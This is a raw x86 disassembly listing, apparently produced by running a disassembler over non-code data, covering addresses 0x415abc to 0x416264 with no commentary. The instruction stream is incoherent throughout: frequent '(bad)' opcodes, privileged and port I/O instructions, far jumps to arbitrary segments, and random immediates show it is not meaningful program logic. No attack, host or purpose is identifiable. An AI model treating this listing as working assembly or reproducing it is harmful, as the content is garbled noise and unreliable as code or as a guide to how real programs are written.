  415abc:	push   esi
  415abd:	mov    al,0x86
  415abf:	pushf  
  415ac0:	inc    ecx
  415ac1:	push   ss
  415ac2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ac3:	pop    eax
  415ac4:	test   al,0x33
  415ac6:	sub    esi,DWORD PTR [eax+0x3a]
  415ac9:	cmp    ebp,DWORD PTR [ecx+0x3c849f23]
  415acf:	daa    
  415ad0:	(bad)  
  415ad1:	adc    esp,DWORD PTR [ebx]
  415ad3:	(bad)  
  415ad4:	mov    bh,0xad
  415ad6:	jle    0x415a91
  415ad8:	jno    0x415b1e
  415ada:	retf   0xa110
  415add:	push   esp
  415ade:	inc    ecx
  415adf:	jb     0x415b33
  415ae1:	call   0x5b2e:0x4e92f069
  415ae8:	dec    ebx
  415ae9:	not    DWORD PTR [ebp+edi*8-0x71]
  415aed:	(bad)  
  415aee:	clc    
  415aef:	ret    
  415af0:	sar    DWORD PTR [eax+0x6907a0f4],cl
  415af6:	push   ds
  415af7:	add    DWORD PTR [esp+eax*8+0x4b9c3735],edi
  415afe:	xchg   esi,eax
  415aff:	adc    ebp,DWORD PTR [edx-0x3595040c]
  415b05:	ret    
  415b06:	into   
  415b07:	adc    eax,eax
  415b09:	push   eax
  415b0a:	pop    eax
  415b0b:	inc    ebp
  415b0c:	mov    edi,0x5faa2e9a
  415b11:	sar    al,0xfe
  415b14:	mov    ds:0x4acbe33e,eax
  415b19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b1a:	cmp    ch,BYTE PTR [esi+esi*2+0x6ffacd3f]
  415b21:	lock ins DWORD PTR es:[edi],dx
  415b23:	fmul   st(1),st
  415b25:	inc    esp
  415b26:	xor    DWORD PTR [edi],edi
  415b28:	cmc    
  415b29:	adc    BYTE PTR [edi+0x3b1d84e2],bl
  415b2f:	sti    
  415b30:	rol    BYTE PTR [ecx+0x7b951931],1
  415b36:	cmp    cl,BYTE PTR [ecx]
  415b38:	xchg   DWORD PTR [esi-0x5b],eax
  415b3b:	adc    DWORD PTR [edx+edx*4-0x37f124ec],esi
  415b42:	mov    ch,0x9d
  415b44:	pop    eax
  415b45:	inc    ecx
  415b46:	and    esp,0x3760f0c3
  415b4c:	mov    edx,DWORD PTR [esi]
  415b4e:	pop    eax
  415b4f:	push   edx
  415b50:	add    BYTE PTR [edi+0x1f],ah
  415b53:	popf   
  415b54:	jb     0x415b4a
  415b56:	inc    esi
  415b57:	stos   BYTE PTR es:[edi],al
  415b58:	push   edi
  415b59:	mov    ds:0x4e9bdc5c,eax
  415b5e:	fwait
  415b5f:	pop    esp
  415b60:	xor    bl,ch
  415b62:	sub    cl,BYTE PTR [edx-0x56]
  415b65:	into   
  415b66:	arpl   WORD PTR [esi],bx
  415b68:	or     eax,DWORD PTR [ebx]
  415b6a:	xchg   edi,eax
  415b6b:	or     DWORD PTR [ebx],edx
  415b6d:	out    0x9,al
  415b6f:	cmp    ecx,DWORD PTR [ebx]
  415b71:	mov    eax,0xd3df3631
  415b76:	call   0xad02:0xc9d5ba40
  415b7d:	pusha  
  415b7e:	push   edx
  415b7f:	imul   esp,DWORD PTR [esi],0xffffffd2
  415b82:	dec    esp
  415b83:	out    0xdc,al
  415b85:	inc    ebx
  415b86:	test   al,0x9b
  415b88:	fs loop 0x415bfb
  415b8b:	dec    edx
  415b8c:	mov    esp,0xb414d8e0
  415b91:	push   ebp
  415b92:	jno    0x415b75
  415b94:	push   0x2f
  415b96:	and    dh,BYTE PTR [edx]
  415b98:	and    bl,BYTE PTR [esi-0x7d915e23]
  415b9e:	mov    edi,0xa23f8d91
  415ba3:	aam    0x4c
  415ba5:	loop   0x415b66
  415ba7:	ret    0x61d1
  415baa:	stos   BYTE PTR es:[edi],al
  415bab:	cwde   
  415bac:	and    BYTE PTR [edi+0x1f],cl
  415baf:	xor    DWORD PTR [ebx+edi*8],edi
  415bb2:	pusha  
  415bb3:	aam    0xec
  415bb5:	mov    dl,0xdf
  415bb7:	jmp    0x415bc6
  415bb9:	cmc    
  415bba:	pop    ebx
  415bbb:	mov    al,ds:0x8a6c86cd
  415bc0:	adc    BYTE PTR [edx],0x58
  415bc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415bc4:	icebp  
  415bc5:	add    bh,BYTE PTR [ebp-0x4779ee47]
  415bcb:	in     eax,0xce
  415bcd:	xchg   edi,eax
  415bce:	or     eax,ebx
  415bd0:	std    
  415bd1:	in     al,dx
  415bd2:	dec    edx
  415bd3:	retf   
  415bd4:	out    dx,al
  415bd5:	gs data16 jne 0x415bc8
  415bd9:	jecxz  0x415b81
  415bdb:	jne    0x415c0d
  415bdd:	cmc    
  415bde:	popf   
  415bdf:	lods   al,BYTE PTR ds:[esi]
  415be0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415be1:	ret    0x47f8
  415be4:	(bad)  
  415be5:	xor    BYTE PTR [esi],bh
  415be7:	jae    0x415c50
  415be9:	pop    esp
  415bea:	xor    al,0x13
  415bec:	or     al,0xdc
  415bee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415bef:	push   ds
  415bf0:	es xchg edx,eax
  415bf2:	mov    ebp,0xa0a54f03
  415bf7:	inc    esp
  415bf8:	sar    DWORD PTR [ecx+ebp*2+0x74],cl
  415bfc:	pop    esi
  415bfd:	or     eax,0x1740cf94
  415c02:	mov    eax,ds:0x6f5bc563
  415c07:	inc    esp
  415c08:	in     al,dx
  415c09:	hlt    
  415c0a:	outs   dx,DWORD PTR ds:[esi]
  415c0b:	pop    edi
  415c0c:	in     eax,0x62
  415c0e:	and    cl,BYTE PTR [ecx]
  415c10:	mov    edx,0x8e4a27a7
  415c15:	push   esp
  415c16:	pop    eax
  415c17:	scas   eax,DWORD PTR es:[edi]
  415c18:	ficom  DWORD PTR ds:[eax+eiz*8]
  415c1c:	xor    BYTE PTR [edx+ecx*8],0xbd
  415c20:	fcomp  DWORD PTR [ebx]
  415c22:	cmp    al,0xb
  415c24:	jmp    0x1bdd:0xa1fd6e4e
  415c2b:	cmp    BYTE PTR ds:0x669385e,bh
  415c31:	push   edi
  415c32:	jns    0x415bd8
  415c34:	jae    0x415ca5
  415c36:	loope  0x415c2e
  415c38:	xchg   edi,eax
  415c39:	ins    DWORD PTR es:[edi],dx
  415c3a:	cmp    al,0x65
  415c3c:	dec    esp
  415c3d:	add    BYTE PTR [edi-0x6d2aa506],bl
  415c43:	inc    ecx
  415c44:	inc    esi
  415c45:	mov    eax,0xe46c67e2
  415c4a:	push   0xb69fe328
  415c4f:	jns    0x415c18
  415c51:	idiv   ch
  415c53:	add    bl,BYTE PTR [ebx+0x6539fdb1]
  415c59:	xor    BYTE PTR [eax],dl
  415c5b:	xchg   edi,eax
  415c5c:	out    dx,al
  415c5d:	push   eax
  415c5e:	retf   
  415c5f:	xchg   ebx,eax
  415c60:	lods   eax,DWORD PTR ds:[esi]
  415c61:	mov    eax,cr1
  415c64:	xlat   BYTE PTR ds:[ebx]
  415c65:	pusha  
  415c66:	pop    ebx
  415c67:	add    BYTE PTR [esi-0xb471936],0x46
  415c6e:	ss ds jecxz 0x415c5e
  415c72:	push   esp
  415c73:	test   BYTE PTR [ebx-0x775695d6],dl
  415c79:	aad    0x85
  415c7b:	rcl    DWORD PTR [ebx-0x202ae1f7],1
  415c81:	stc    
  415c82:	mov    dh,cl
  415c84:	add    edi,DWORD PTR [esi]
  415c86:	mov    ebx,0x3a39a507
  415c8b:	sbb    eax,0xd6758c86
  415c90:	pushf  
  415c91:	cmp    esp,0xb45b3fd7
  415c97:	mov    edx,DWORD PTR [esi-0x56660b18]
  415c9d:	cmc    
  415c9e:	fdivr  QWORD PTR [eax+esi*8]
  415ca1:	xor    eax,0x16a2f855
  415ca6:	cli    
  415ca7:	pop    es
  415ca8:	cmp    edi,DWORD PTR [edi+0x3d]
  415cab:	test   eax,0x2d2a59bc
  415cb0:	iret   
  415cb1:	mov    dh,0xf8
  415cb3:	mov    esi,db6
  415cb6:	call   0x8b67:0xa91be86
  415cbd:	scas   eax,DWORD PTR es:[edi]
  415cbe:	data16 arpl WORD PTR [esi+0x2db9fac1],bx
  415cc5:	add    al,0x93
  415cc7:	inc    edx
  415cc8:	or     eax,0xa119e038
  415ccd:	pop    ebx
  415cce:	gs mov esp,0xbef76bee
  415cd4:	in     al,0x14
  415cd6:	inc    ebp
  415cd7:	aad    0xdb
  415cd9:	sbb    ah,bh
  415cdb:	cmp    ch,ch
  415cdd:	sub    dh,BYTE PTR [edi+0x68bef5bc]
  415ce3:	clc    
  415ce4:	aad    0xfd
  415ce6:	(bad)  
  415ce7:	sub    al,0x10
  415ce9:	push   edx
  415cea:	repz mov ?,WORD PTR [esi-0x2908c396]
  415cf1:	stos   DWORD PTR es:[edi],eax
  415cf2:	fistp  QWORD PTR [ecx+0x44]
  415cf5:	jmp    0x415d3f
  415cf7:	and    BYTE PTR [esi],cl
  415cf9:	mov    ebx,gs
  415cfb:	(bad)  
  415cfd:	pop    eax
  415cfe:	cld    
  415cff:	sti    
  415d00:	(bad)  
  415d01:	xchg   esi,eax
  415d02:	push   ebp
  415d03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d04:	test   al,0x9e
  415d06:	cmp    bl,BYTE PTR ds:0x3459c864
  415d0c:	daa    
  415d0d:	lods   al,BYTE PTR ds:[esi]
  415d0e:	int    0x9a
  415d10:	push   edi
  415d11:	les    esi,FWORD PTR [esi+0x5659172f]
  415d17:	test   eax,0x431785f4
  415d1c:	sub    eax,edi
  415d1e:	or     al,0x25
  415d20:	inc    esi
  415d21:	pop    ss
  415d22:	push   ebp
  415d23:	data16 rcr BYTE PTR [eax-0xce1fb08],1
  415d2a:	sub    DWORD PTR [esi+eax*8],ebp
  415d2d:	pop    ecx
  415d2e:	dec    dl
  415d30:	add    BYTE PTR [eax],dh
  415d32:	xchg   esp,eax
  415d33:	mov    dl,0x7a
  415d35:	das    
  415d36:	cmp    bl,BYTE PTR [ebx-0x61d1b222]
  415d3c:	xor    ecx,DWORD PTR [ebp+ecx*1-0x485ac0f3]
  415d43:	mov    ch,0xfa
  415d45:	push   esi
  415d46:	in     eax,dx
  415d47:	cmc    
  415d48:	fmul   DWORD PTR [ebp+0x70]
  415d4b:	pusha  
  415d4c:	call   0x1e54:0x4ddda51c
  415d53:	add    ah,BYTE PTR [esi-0x5a]
  415d56:	dec    esi
  415d57:	pop    esp
  415d58:	ret    
  415d59:	lods   al,BYTE PTR ds:[esi]
  415d5a:	out    0xca,al
  415d5c:	test   BYTE PTR [ebx+0x58],dl
  415d5f:	push   ss
  415d60:	dec    ebx
  415d61:	fs fs test ecx,ecx
  415d65:	sbb    eax,0xf1e7c221
  415d6a:	inc    edi
  415d6b:	jae    0x415d75
  415d6d:	mov    edi,0xe4ba00af
  415d72:	fidiv  DWORD PTR [edx-0x7b8e5dcc]
  415d78:	es out dx,al
  415d7a:	fs dec esp
  415d7c:	inc    ebx
  415d7d:	pusha  
  415d7e:	adc    eax,0x70df67be
  415d83:	add    BYTE PTR [eax],bl
  415d85:	mov    edx,0x863ca478
  415d8a:	and    eax,0x8bd11f55
  415d8f:	inc    edi
  415d90:	xor    al,0xb5
  415d92:	sbb    eax,DWORD PTR [esi+0xd02e371]
  415d98:	pop    ecx
  415d99:	mov    ebp,?
  415d9b:	push   edx
  415d9c:	dec    eax
  415d9d:	je     0x415dd5
  415d9f:	(bad)  
  415da0:	mov    ds:0x3bd5e6d,al
  415da5:	inc    ecx
  415da6:	add    al,0x9c
  415da8:	imul   edx,DWORD PTR [ebx+esi*1-0x8],0xffffff89
  415dad:	dec    ebp
  415dae:	adc    cl,ch
  415db0:	test   DWORD PTR ds:0x8a400000,eax
  415db6:	dec    esp
  415db7:	cmp    edi,DWORD PTR [ecx+eax*2]
  415dba:	inc    eax
  415dbb:	nop
  415dbc:	scas   eax,DWORD PTR es:[edi]
  415dbd:	shl    eax,0x74
  415dc0:	inc    esi
  415dc1:	add    DWORD PTR [esi+ebp*2+0x160cb326],ecx
  415dc8:	cmp    eax,0x93161604
  415dcd:	lods   al,BYTE PTR ds:[esi]
  415dce:	push   esi
  415dcf:	ss je  0x415e19
  415dd2:	mov    ebx,0x3418e227
  415dd7:	add    DWORD PTR [esp+eax*4-0x2],edx
  415ddb:	push   edi
  415ddc:	int3   
  415ddd:	ins    DWORD PTR es:[edi],dx
  415dde:	in     al,dx
  415ddf:	fwait
  415de0:	sub    DWORD PTR [ebp+0x1f],0xffffffc5
  415de4:	pop    eax
  415de5:	(bad)  
  415de6:	mov    ch,0xe5
  415de8:	adc    cl,BYTE PTR cs:[esi+ecx*4]
  415dec:	or     DWORD PTR [eax-0x4acfd3d9],esi
  415df2:	sub    eax,0x519e2b28
  415df7:	push   cs
  415df8:	out    dx,eax
  415df9:	clc    
  415dfa:	test   edi,ebx
  415dfc:	call   0xde1390ec
  415e01:	fnop   
  415e03:	jp     0x415de8
  415e05:	inc    edi
  415e06:	lods   eax,DWORD PTR ds:[esi]
  415e07:	inc    esp
  415e08:	push   ss
  415e09:	lods   al,BYTE PTR ds:[esi]
  415e0a:	cmp    eax,0xc8e4d4fb
  415e0f:	jmp    0x415e50
  415e11:	mov    esp,0xc8436646
  415e16:	jle    0x415e27
  415e18:	xchg   DWORD PTR ds:0x607601a3,esp
  415e1e:	ss add al,0xc7
  415e21:	fstp   DWORD PTR [bp-0x8]
  415e25:	push   ebp
  415e26:	test   ah,al
  415e28:	dec    ecx
  415e29:	sub    ebp,DWORD PTR [eax-0x5ee9ebe7]
  415e2f:	push   0x2a
  415e31:	fs inc ebx
  415e33:	fisub  WORD PTR [ecx]
  415e35:	ror    ebx,0x10
  415e38:	inc    esp
  415e39:	stos   BYTE PTR es:[edi],al
  415e3a:	mov    esp,0x768f7554
  415e3f:	hlt    
  415e40:	test   al,0xc2
  415e42:	popaw  
  415e44:	idiv   BYTE PTR [esi-0x7f]
  415e47:	jle    0x415dd0
  415e49:	add    cl,bl
  415e4b:	push   eax
  415e4c:	loope  0x415e95
  415e4e:	cmp    ecx,DWORD PTR [edi+0x40083b09]
  415e54:	mov    edx,0xe06842f3
  415e59:	nop
  415e5a:	jp     0x415e6f
  415e5c:	adc    bl,BYTE PTR [edx]
  415e5e:	jb     0x415eb5
  415e60:	out    0xd0,eax
  415e62:	popa   
  415e63:	and    ebx,DWORD PTR [ebx+ebp*2]
  415e66:	mov    ch,cl
  415e68:	jae    0x415df0
  415e6a:	aad    0x3a
  415e6c:	jp     0x415df3
  415e6e:	mov    gs,WORD PTR [edi]
  415e70:	adc    BYTE PTR ds:0xe2f7b50f,0xf3
  415e77:	ds push 0xa745f0ce
  415e7d:	dec    edx
  415e7e:	jne    0x415ebb
  415e80:	mov    esi,0xb8a94c0d
  415e85:	lds    edx,FWORD PTR [edx-0x70]
  415e88:	hlt    
  415e89:	pop    ss
  415e8a:	or     DWORD PTR [edi+edx*2-0x16c8a2c],esi
  415e91:	cwde   
  415e92:	je     0x415ee9
  415e94:	sti    
  415e95:	jmp    0x415ef2
  415e97:	sbb    eax,0xbe6450d8
  415e9c:	iret   
  415e9d:	or     eax,0xca757319
  415ea2:	ror    BYTE PTR [edi+0x3a],0xcd
  415ea6:	push   edx
  415ea7:	cwde   
  415ea8:	icebp  
  415ea9:	js     0x415eea
  415eab:	push   ecx
  415eac:	test   eax,0x6a29bdf5
  415eb1:	retf   0x8d5a
  415eb4:	test   BYTE PTR [ebx],dh
  415eb6:	daa    
  415eb7:	lods   eax,DWORD PTR ds:[esi]
  415eb8:	fucomip st,st(4)
  415eba:	jmp    0xe189d2b7
  415ebf:	fbstp  TBYTE PTR [ebp+0x91c3b5f]
  415ec5:	mov    al,0xc5
  415ec7:	and    DWORD PTR [esi],edx
  415ec9:	rol    DWORD PTR [ecx],1
  415ecb:	inc    edi
  415ecc:	xchg   ecx,eax
  415ecd:	bound  edx,QWORD PTR [ebx+0xac45d4]
  415ed3:	xor    esi,edx
  415ed5:	ins    BYTE PTR es:[edi],dx
  415ed6:	xchg   cx,ax
  415ed8:	lds    ebx,FWORD PTR [edi+0x5a]
  415edb:	cmp    cx,ax
  415ede:	xor    al,0x3d
  415ee0:	fdivr  QWORD PTR [ebp-0x59e956a0]
  415ee6:	js     0x415e7f
  415ee8:	adc    dl,BYTE PTR [esi]
  415eea:	pop    ecx
  415eeb:	cld    
  415eec:	loope  0x415f63
  415eee:	lods   eax,DWORD PTR ds:[esi]
  415eef:	adc    eax,0x807948ef
  415ef4:	(bad)  
  415ef5:	fdiv   st(0),st
  415ef7:	dec    edi
  415ef8:	pop    ss
  415ef9:	outs   dx,DWORD PTR ds:[esi]
  415efa:	jge    0x415f67
  415efc:	push   cs
  415efd:	mov    dh,0x81
  415eff:	scas   al,BYTE PTR es:[edi]
  415f00:	arpl   WORD PTR [ebp-0x151736d5],sp
  415f06:	push   cs
  415f07:	ret    0x7998
  415f0a:	test   DWORD PTR [edx-0x782de8af],eax
  415f10:	cmp    DWORD PTR [esp+eax*4],esi
  415f13:	stos   BYTE PTR es:[edi],al
  415f14:	xor    edx,DWORD PTR [edi-0x3a9b0f23]
  415f1a:	jp     0x415f25
  415f1c:	mov    bh,0x9e
  415f1e:	(bad)  
  415f1f:	mov    cl,0x60
  415f21:	jb     0x415f46
  415f23:	mov    WORD PTR [ebp-0x4b],ds
  415f26:	cld    
  415f27:	mov    BYTE PTR [eax-0x1c971554],bl
  415f2d:	fisubr DWORD PTR [ebp+0x273e575a]
  415f33:	xor    bh,dh
  415f35:	das    
  415f36:	fidiv  WORD PTR [edx+0x6e69e383]
  415f3c:	dec    ebx
  415f3d:	hlt    
  415f3e:	fmul   st,st(5)
  415f40:	xchg   ebx,eax
  415f41:	jnp    0x415f97
  415f43:	mov    edx,0x4dab6973
  415f48:	and    ah,cl
  415f4a:	pop    es
  415f4b:	in     eax,0xa2
  415f4d:	sbb    BYTE PTR [edx+ebx*1],dl
  415f50:	test   BYTE PTR [ecx],ah
  415f52:	mov    al,ds:0x6574cac5
  415f57:	rcl    bl,0xaa
  415f5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f5b:	xchg   esi,eax
  415f5c:	push   0xfe66b8bf
  415f61:	push   ebx
  415f62:	inc    eax
  415f63:	xor    edx,DWORD PTR [ebx]
  415f65:	mov    bl,0xab
  415f67:	sbb    al,0xe6
  415f69:	sbb    BYTE PTR [edx-0x12],dl
  415f6c:	daa    
  415f6d:	sbb    al,0x4b
  415f6f:	loope  0x415f66
  415f71:	cli    
  415f72:	pop    ecx
  415f73:	pop    DWORD PTR [edx]
  415f75:	xchg   BYTE PTR [edi+0x202d54b0],dl
  415f7b:	sub    DWORD PTR [ebp-0x50264858],0xffffffde
  415f82:	mov    fs:0x7a278808,al
  415f88:	jo     0x415fe3
  415f8a:	bound  edi,QWORD PTR [ecx+0x69765398]
  415f90:	test   DWORD PTR [ebp-0xd],ebp
  415f93:	mov    esp,ds
  415f95:	cdq    
  415f96:	cwde   
  415f97:	fild   DWORD PTR [esi+0x71dca014]
  415f9d:	fldenv [eax]
  415f9f:	mov    WORD PTR [edx+0x202fd778],gs
  415fa5:	dec    BYTE PTR [ecx-0x3]
  415fa8:	das    
  415fa9:	dec    esp
  415faa:	xchg   ebp,eax
  415fab:	xchg   ecx,eax
  415fac:	and    BYTE PTR [edi],0x4a
  415faf:	jl     0x415fe5
  415fb1:	icebp  
  415fb2:	shr    DWORD PTR [ebx+0x7b80acbb],cl
  415fb8:	leave  
  415fb9:	sub    al,0x3d
  415fbb:	add    dh,cl
  415fbd:	xchg   ebp,eax
  415fbe:	jg     0x415f8b
  415fc0:	lods   al,BYTE PTR ds:[esi]
  415fc1:	sbb    bh,BYTE PTR [ecx]
  415fc3:	in     eax,0xda
  415fc5:	mov    dl,BYTE PTR [edx-0x5e]
  415fc8:	adc    DWORD PTR [ecx-0x4adc97c0],ebx
  415fce:	dec    eax
  415fcf:	mov    ss,WORD PTR [ebx-0x6b]
  415fd2:	(bad)  
  415fd3:	arpl   WORD PTR [eax+0x62],bx
  415fd6:	fisubr DWORD PTR [esi-0x80]
  415fd9:	aaa    
  415fda:	cmp    eax,0x85664a79
  415fdf:	popa   
  415fe0:	out    0xd9,al
  415fe2:	call   0xcd2e:0x4aff387
  415fe9:	sub    eax,0xb336db23
  415fee:	and    al,0xa3
  415ff0:	into   
  415ff1:	sub    al,0xc4
  415ff3:	pop    ebp
  415ff4:	test   DWORD PTR [edi+0x62],0x3a50147b
  415ffb:	push   ds
  415ffc:	jp     0x415f8a
  415ffe:	mov    ebp,0x8c002ff1
  416003:	cld    
  416004:	sub    al,BYTE PTR [ebx]
  416006:	clc    
  416007:	mov    bx,0x37b7
  41600b:	loope  0x415fc5
  41600d:	test   eax,0x23d52ffc
  416012:	pusha  
  416013:	arpl   WORD PTR [edx-0xbb70067],ax
  416019:	ret    
  41601a:	inc    esp
  41601b:	jo     0x415fee
  41601d:	jno    0x415fe3
  41601f:	push   0xffffff85
  416021:	arpl   bp,ax
  416023:	jle    0x415fe8
  416025:	dec    ecx
  416026:	fnstenv [ecx+edx*8]
  416029:	fisub  WORD PTR [ecx+0x1373b216]
  41602f:	dec    ebp
  416030:	sub    edx,edx
  416032:	pop    eax
  416033:	mov    edx,0x76cf2b9c
  416038:	shr    dh,cl
  41603a:	dec    edi
  41603b:	mov    ebp,0x8517aff2
  416040:	das    
  416041:	lahf   
  416042:	push   cs
  416043:	or     esp,DWORD PTR [ebx+0x3cd34a1a]
  416049:	in     eax,0x7e
  41604b:	int3   
  41604c:	mov    ebp,0x2a4ddb76
  416051:	or     BYTE PTR [edi-0x7dd09edc],ch
  416057:	imul   ecx,ecx,0xd8b239cc
  41605d:	(bad)  
  41605e:	nop
  41605f:	popf   
  416060:	xor    bl,BYTE PTR [ebx+0x81fd13b]
  416066:	lods   eax,DWORD PTR ds:[esi]
  416067:	jmp    0x4160a7
  416069:	mov    bl,ah
  41606b:	cmp    al,0xda
  41606d:	pop    eax
  41606e:	out    0x4f,al
  416070:	add    DWORD PTR [eiz*4+0x526f842f],0xfd34b192
  41607b:	jne    0x416044
  41607d:	cwde   
  41607e:	or     eax,0x934c1b2c
  416083:	sbb    ebx,0x58
  416086:	ins    BYTE PTR es:[edi],dx
  416087:	ins    BYTE PTR es:[edi],dx
  416088:	mov    bh,0x58
  41608a:	pop    ss
  41608b:	push   cs
  41608c:	and    edi,esi
  41608e:	bound  edi,QWORD PTR [edi]
  416090:	mov    al,ds:0x48c6d062
  416095:	xor    BYTE PTR [edx-0x2848136f],ah
  41609b:	popf   
  41609c:	jmp    0xa659:0x11f926c2
  4160a3:	sbb    ebp,DWORD PTR [ecx]
  4160a5:	add    bl,BYTE PTR ds:0x43fa5e58
  4160ab:	cmp    BYTE PTR [ecx+0x5f],ah
  4160ae:	int3   
  4160af:	lods   eax,DWORD PTR ds:[esi]
  4160b0:	test   DWORD PTR [ebp+0x1c],edx
  4160b3:	pop    esi
  4160b4:	sahf   
  4160b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4160b6:	adc    DWORD PTR [edx+0x173a45d1],0xee377880
  4160c0:	nop
  4160c1:	mov    dh,0xbb
  4160c3:	sub    bh,ah
  4160c5:	or     ebp,DWORD PTR [edx+0x210f31d1]
  4160cb:	arpl   WORD PTR [edi+edi*2],bp
  4160ce:	mov    cl,ah
  4160d0:	push   0xffffffb3
  4160d2:	mov    bl,0x6c
  4160d4:	xlat   BYTE PTR ds:[ebx]
  4160d5:	ret    
  4160d6:	inc    esp
  4160d7:	(bad)  [ebx-0x447b6b55]
  4160dd:	jg     0x4160cd
  4160df:	ret    0x74c5
  4160e2:	outs   dx,DWORD PTR ds:[esi]
  4160e3:	pop    edx
  4160e4:	ja     0x416138
  4160e6:	xchg   ecx,eax
  4160e7:	mov    al,ds:0x7a923f67
  4160ec:	sbb    DWORD PTR [ebx],esi
  4160ee:	in     eax,0x28
  4160f0:	sbb    BYTE PTR [esi],dh
  4160f2:	sbb    edi,DWORD PTR [ebx+0x4d]
  4160f5:	loopne 0x4160b4
  4160f7:	ins    BYTE PTR es:[edi],dx
  4160f8:	dec    esi
  4160f9:	js     0x416099
  4160fb:	or     eax,0x4c39d088
  416100:	mov    bl,0x8f
  416102:	mov    ds:0x85d8dda2,eax
  416107:	pop    esi
  416108:	sbb    eax,0x27a872d0
  41610d:	cmp    BYTE PTR [ecx+0x781deace],0xb8
  416114:	shl    DWORD PTR [edi+0x4f],cl
  416117:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416118:	rol    BYTE PTR [eax+ebx*2-0x3],cl
  41611c:	sbb    bh,ah
  41611e:	daa    
  41611f:	jle    0x416188
  416121:	dec    eax
  416122:	enter  0xfbc3,0xf1
  416126:	ins    DWORD PTR es:[edi],dx
  416127:	cli    
  416128:	xlat   BYTE PTR ds:[ebx]
  416129:	call   0x626c221f
  41612e:	(bad)  
  41612f:	std    
  416130:	add    eax,0x3725df69
  416135:	adc    dh,BYTE PTR [ebx-0x2f]
  416138:	mov    ebx,0xd96202ec
  41613d:	in     al,0xd4
  41613f:	popa   
  416140:	jl     0x416150
  416142:	int    0xd7
  416144:	fimul  DWORD PTR [edi-0x49]
  416147:	mov    bh,0xe2
  416149:	enter  0x132f,0x38
  41614d:	cmp    esp,edx
  41614f:	pop    ebx
  416150:	pop    edi
  416151:	cmp    eax,0xed0b0154
  416156:	mov    ds:0x223a1232,eax
  41615b:	pop    es
  41615c:	xor    al,0xed
  41615e:	ins    DWORD PTR es:[edi],dx
  41615f:	xor    al,0xa8
  416161:	cmp    DWORD PTR [eax+eiz*2+0x74],esi
  416165:	hlt    
  416166:	lea    ecx,[ecx+ecx*4]
  416169:	mov    ds:0xb5333eb7,al
  41616e:	psubb  mm2,mm6
  416171:	or     bl,bh
  416173:	mov    edi,esi
  416175:	leave  
  416176:	aaa    
  416177:	and    DWORD PTR [edx+eiz*8+0x72e72174],esi
  41617e:	(bad)  
  41617f:	fimul  WORD PTR [ebx+0x75]
  416182:	push   ss
  416183:	and    eax,0x6363ad5c
  416188:	fs add al,0xbb
  41618b:	cmp    edi,DWORD PTR [eax+ebx*4-0x48]
  41618f:	xchg   DWORD PTR [edx-0x8bf89d2],edi
  416195:	icebp  
  416196:	jmp    FWORD PTR [eax]
  416198:	int    0xf7
  41619a:	sbb    al,0xb0
  41619c:	add    ebp,ebx
  41619e:	clc    
  41619f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4161a0:	xor    al,0x25
  4161a2:	sbb    DWORD PTR [esi+0x23],esi
  4161a5:	inc    ebx
  4161a6:	(bad)  
  4161a7:	retf   
  4161a8:	in     al,dx
  4161a9:	mov    al,ds:0xb5047849
  4161ae:	xchg   ebp,eax
  4161af:	test   BYTE PTR [ebx],al
  4161b1:	cmp    bh,BYTE PTR [ecx+ecx*4+0x4fb75f7f]
  4161b8:	shl    DWORD PTR [ebp+0x7d],0xf7
  4161bc:	pusha  
  4161bd:	push   0xffffffb1
  4161bf:	ja     0x416210
  4161c1:	aam    0x1d
  4161c3:	loope  0x416217
  4161c5:	add    ebp,DWORD PTR [eax+eiz*8]
  4161c8:	nop
  4161c9:	out    0x54,eax
  4161cb:	sub    DWORD PTR [ecx],ebx
  4161cd:	dec    esi
  4161ce:	in     al,0xc6
  4161d0:	or     BYTE PTR [ebp-0xc969f36],cl
  4161d6:	push   eax
  4161d7:	fdivr  QWORD PTR [eax-0x6]
  4161da:	xor    edi,DWORD PTR [ebp+0x5f]
  4161dd:	xlat   BYTE PTR ds:[ebx]
  4161de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4161df:	jne    0x4161e1
  4161e1:	fs daa 
  4161e3:	pop    ds
  4161e4:	pop    edi
  4161e5:	adc    ah,BYTE PTR [edx-0x3570a293]
  4161eb:	mov    ds:0x48c75d6f,eax
  4161f0:	aam    0xb4
  4161f2:	mov    ds,WORD PTR [ecx]
  4161f4:	sub    al,0x2
  4161f6:	je     0x416226
  4161f8:	mov    ah,0x0
  4161fa:	inc    esi
  4161fb:	retf   
  4161fc:	outs   dx,BYTE PTR ds:[esi]
  4161fd:	test   DWORD PTR [esi+0x4d572dc5],edi
  416203:	repz lock dec eax
  416206:	add    ebp,edi
  416208:	inc    ebp
  416209:	push   ds
  41620a:	stos   DWORD PTR es:[edi],eax
  41620b:	sahf   
  41620c:	(bad)  
  41620d:	xlat   BYTE PTR ds:[ebx]
  41620e:	xor    al,0x1a
  416210:	fcmove st,st(1)
  416212:	pushf  
  416213:	add    al,0x90
  416215:	cmp    eax,DWORD PTR [ebp+0x1b]
  416218:	popa   
  416219:	add    BYTE PTR [edi+0x1f6203c7],0x62
  416220:	mov    DWORD PTR [esi],ecx
  416222:	jae    0x416270
  416224:	out    dx,eax
  416225:	rol    ecx,cl
  416227:	jmp    0xff51:0x93d23f6e
  41622e:	adc    al,0x1d
  416230:	add    ah,0x28
  416233:	ja     0x4161ba
  416235:	xchg   esi,eax
  416236:	cmp    eax,0x86ee5597
  41623b:	push   ss
  41623c:	retf   0xfcae
  41623f:	push   ds
  416240:	xchg   ecx,eax
  416241:	mov    BYTE PTR [esi+ebp*8+0x5cf9d6e2],bh
  416248:	out    dx,al
  416249:	xchg   DWORD PTR [edi+ebx*1+0x74deca6a],ebx
  416250:	xor    DWORD PTR ds:0x3afe42c1,esp
  416256:	sub    bh,BYTE PTR [eax]
  416258:	pop    ax
  41625a:	fimul  DWORD PTR [edi-0x4b]
  41625d:	push   0xffffffc2
  41625f:	jne    0x416294
  416261:	inc    ebp
  416262:	loope  0x4161e4
  416264:	sub    cl,BYTE PTR [ecx]
